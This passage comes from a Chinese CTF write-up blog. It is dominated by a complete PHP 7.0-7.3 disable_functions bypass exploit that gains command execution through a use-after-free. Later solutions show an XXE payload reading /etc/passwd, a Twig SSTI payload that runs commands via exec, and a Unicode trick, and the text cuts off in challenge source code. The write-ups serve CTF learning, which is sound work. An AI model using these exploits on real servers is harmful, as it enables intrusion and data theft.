class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class=\"line\">#</span><br><span class=\"line\"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class=\"line\">#</span><br><span class=\"line\"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class=\"line\">#</span><br><span class=\"line\"># Author: https://github.com/mm0r1</span><br><span class=\"line\"></span><br><span class=\"line\">pwn(&quot;../../.././readflag&quot;);   #这里是想要执行的命令</span><br><span class=\"line\"></span><br><span class=\"line\">function pwn($cmd) &#123;</span><br><span class=\"line\">    global $abc, $helper;</span><br><span class=\"line\"></span><br><span class=\"line\">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class=\"line\">        $address = 0;</span><br><span class=\"line\">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class=\"line\">            $address &lt;&lt;= 8;</span><br><span class=\"line\">            $address |= ord($str[$p+$j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $address;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class=\"line\">        $out = &quot;&quot;;</span><br><span class=\"line\">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class=\"line\">            $out .= chr($ptr &amp; 0xff);</span><br><span class=\"line\">            $ptr &gt;&gt;= 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class=\"line\">        $i = 0;</span><br><span class=\"line\">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class=\"line\">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class=\"line\">            $v &gt;&gt;= 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class=\"line\">        global $abc, $helper;</span><br><span class=\"line\">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class=\"line\">        $leak = strlen($helper-&gt;a);</span><br><span class=\"line\">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class=\"line\">        return $leak;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function parse_elf($base) &#123;</span><br><span class=\"line\">        $e_type = leak($base, 0x10, 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        $e_phoff = leak($base, 0x20);</span><br><span class=\"line\">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class=\"line\">        $e_phnum = leak($base, 0x38, 2);</span><br><span class=\"line\"></span><br><span class=\"line\">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class=\"line\">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class=\"line\">            $p_type  = leak($header, 0, 4);</span><br><span class=\"line\">            $p_flags = leak($header, 4, 4);</span><br><span class=\"line\">            $p_vaddr = leak($header, 0x10);</span><br><span class=\"line\">            $p_memsz = leak($header, 0x28);</span><br><span class=\"line\"></span><br><span class=\"line\">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class=\"line\">                # handle pie</span><br><span class=\"line\">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class=\"line\">                $data_size = $p_memsz;</span><br><span class=\"line\">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class=\"line\">                $text_size = $p_memsz;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class=\"line\">            return false;</span><br><span class=\"line\"></span><br><span class=\"line\">        return [$data_addr, $text_size, $data_size];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_basic_funcs($base, $elf) &#123;</span><br><span class=\"line\">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class=\"line\">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class=\"line\">            $leak = leak($data_addr, $i * 8);</span><br><span class=\"line\">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class=\"line\">                $deref = leak($leak);</span><br><span class=\"line\">                # &#x27;constant&#x27; constant check</span><br><span class=\"line\">                if($deref != 0x746e6174736e6f63)</span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">            &#125; else continue;</span><br><span class=\"line\"></span><br><span class=\"line\">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class=\"line\">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class=\"line\">                $deref = leak($leak);</span><br><span class=\"line\">                # &#x27;bin2hex&#x27; constant check</span><br><span class=\"line\">                if($deref != 0x786568326e6962)</span><br><span class=\"line\">                    continue;</span><br><span class=\"line\">            &#125; else continue;</span><br><span class=\"line\"></span><br><span class=\"line\">            return $data_addr + $i * 8;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_binary_base($binary_leak) &#123;</span><br><span class=\"line\">        $base = 0;</span><br><span class=\"line\">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class=\"line\">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class=\"line\">            $addr = $start - 0x1000 * $i;</span><br><span class=\"line\">            $leak = leak($addr, 0, 7);</span><br><span class=\"line\">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class=\"line\">                return $addr;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get_system($basic_funcs) &#123;</span><br><span class=\"line\">        $addr = $basic_funcs;</span><br><span class=\"line\">        do &#123;</span><br><span class=\"line\">            $f_entry = leak($addr);</span><br><span class=\"line\">            $f_name = leak($f_entry, 0, 6);</span><br><span class=\"line\"></span><br><span class=\"line\">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class=\"line\">                return leak($addr + 8);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $addr += 0x20;</span><br><span class=\"line\">        &#125; while($f_entry != 0);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class ryat &#123;</span><br><span class=\"line\">        var $ryat;</span><br><span class=\"line\">        var $chtg;</span><br><span class=\"line\">        </span><br><span class=\"line\">        function __destruct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class=\"line\">            $this-&gt;ryat = 1;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Helper &#123;</span><br><span class=\"line\">        public $a, $b, $c, $d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class=\"line\">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class=\"line\"></span><br><span class=\"line\">    $contiguous = [];</span><br><span class=\"line\">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class=\"line\">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class=\"line\"></span><br><span class=\"line\">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class=\"line\">    $out = unserialize($poc);</span><br><span class=\"line\">    gc_collect_cycles();</span><br><span class=\"line\"></span><br><span class=\"line\">    $v = [];</span><br><span class=\"line\">    $v[0] = ptr2str(0, 79);</span><br><span class=\"line\">    unset($v);</span><br><span class=\"line\">    $abc = $out[2][0];</span><br><span class=\"line\"></span><br><span class=\"line\">    $helper = new Helper;</span><br><span class=\"line\">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class=\"line\">        die(&quot;UAF failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # leaks</span><br><span class=\"line\">    $closure_handlers = str2ptr($abc, 0);</span><br><span class=\"line\">    $php_heap = str2ptr($abc, 0x58);</span><br><span class=\"line\">    $abc_addr = $php_heap - 0xc8;</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake value</span><br><span class=\"line\">    write($abc, 0x60, 2);</span><br><span class=\"line\">    write($abc, 0x70, 6);</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake reference</span><br><span class=\"line\">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class=\"line\">    write($abc, 0x18, 0xa);</span><br><span class=\"line\"></span><br><span class=\"line\">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class=\"line\"></span><br><span class=\"line\">    $binary_leak = leak($closure_handlers, 8);</span><br><span class=\"line\">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($elf = parse_elf($base))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class=\"line\">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # fake closure object</span><br><span class=\"line\">    $fake_obj_offset = 0xd0;</span><br><span class=\"line\">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class=\"line\">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    # pwn</span><br><span class=\"line\">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class=\"line\">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class=\"line\">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class=\"line\"></span><br><span class=\"line\">    ($helper-&gt;b)($cmd);</span><br><span class=\"line\"></span><br><span class=\"line\">    exit();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"03-02\"><a href=\"#03-02\" class=\"headerlink\" title=\"03.02\"></a>03.02</h1><hr>\n<h1 id=\"NCTF2019-Fake-XML-cookbook\"><a href=\"#NCTF2019-Fake-XML-cookbook\" class=\"headerlink\" title=\"[NCTF2019]Fake XML cookbook\"></a>[NCTF2019]Fake XML cookbook</h1><p>根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。</p>\n<p>使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">Content-Type: application/xml;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n\n<p>去摸一个payload试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test [</span><br><span class=\"line\">  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class=\"line\">  ]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功读取文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png\"></p>\n<p>把路径改为/flag，获得flag</p>\n<hr>\n<h1 id=\"ASIS-2019-Unicorn-shop\"><a href=\"#ASIS-2019-Unicorn-shop\" class=\"headerlink\" title=\"[ASIS 2019]Unicorn shop\"></a>[ASIS 2019]Unicorn shop</h1><p>这道题绝活。学到了unicode的安全问题：<a href=\"https://xz.aliyun.com/t/5402\">浅谈Unicode设计的安全性</a>，看了wp。</p>\n<p>进入网站一个本杰明·富兰克林至理名言：</p>\n<blockquote>\n<p>金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多</p>\n</blockquote>\n<p><del>差点信了，我就要赚钱花(小声bb)</del></p>\n<p>下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示                                    ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。</p>\n<p>一个和unicode有关的网站：<a href=\"https://www.compart.com/en/unicode\">https://www.compart.com/en/unicode</a></p>\n<p>网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：<kbd>Ctrl</kbd>+<kbd>F</kbd>搜索thousand，找1377以上的都可。</p>\n<p>我选的是这个<code>፼</code>数值是1w，直接传传不过去，使用url编码一次再传。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png\"></p>\n<hr>\n<h1 id=\"BJDCTF2020-Cookie-is-so-stable\"><a href=\"#BJDCTF2020-Cookie-is-so-stable\" class=\"headerlink\" title=\"[BJDCTF2020]Cookie is so stable\"></a>[BJDCTF2020]Cookie is so stable</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png\"></p>\n<p>这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有</p>\n<blockquote>\n<p>Why not take a closer look at cookies?</p>\n</blockquote>\n<p>去flag.php提交个1之后，看cookie为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1</span><br></pre></td></tr></table></figure>\n\n<p>一目了然，接下来就是找payload。再使用之前的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>\n\n<p>被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我是受了这位师傅的<a href=\"https://www.cnblogs.com/bmjoker/p/13508538.html\">文章</a>启发，又去结合了下这道题的<a href=\"https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig\">源码</a>才搞明白。</p>\n<p>这道题在渲染之前使用了twig模板：</p>\n<blockquote>\n<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>\n</blockquote>\n<p>我同样在题目的源码中找到了<code>render()</code>方法和<code>Twig_Environment</code>配置信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png\"></p>\n<p>然后payload的具体原理在的<code>Environment.php</code>中,贴一下和payload相关部分：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png\"></p>\n<ol>\n<li>先执行<code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;</code>调用了<code>registerUndefinedFilterCallback()</code>函数(图中884行)，注册了一个未定义的函数到<code>filterCallbacks</code>全局变量中</li>\n<li>接着执行<code>&#123;&#123;_self.env.getFilter(\"whoami\")&#125;&#125;</code>调用了<code>getFilter()</code>函数，并传入变量<code>$name</code>值为执行的命令，当函数执行到图中代码875行时，进入循环执行了<code>call_user_func()</code>，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的<code>filterCallbacks</code>全局变量，里边已经躺好了一个刚刚注册的<code>exec</code>，至此就形成了payload</li>\n</ol>\n<hr>\n<h1 id=\"小彩蛋\"><a href=\"#小彩蛋\" class=\"headerlink\" title=\"小彩蛋\"></a>小彩蛋</h1><p>现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png\"></p>\n<p>挺草的记一下。</p>\n<hr>\n<h1 id=\"CISCN-2019-初赛-Love-Math\"><a href=\"#CISCN-2019-初赛-Love-Math\" class=\"headerlink\" title=\"[CISCN 2019 初赛]Love Math\"></a>[CISCN 2019 初赛]Love Math</h1><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;太长了不会算&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\">    <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span 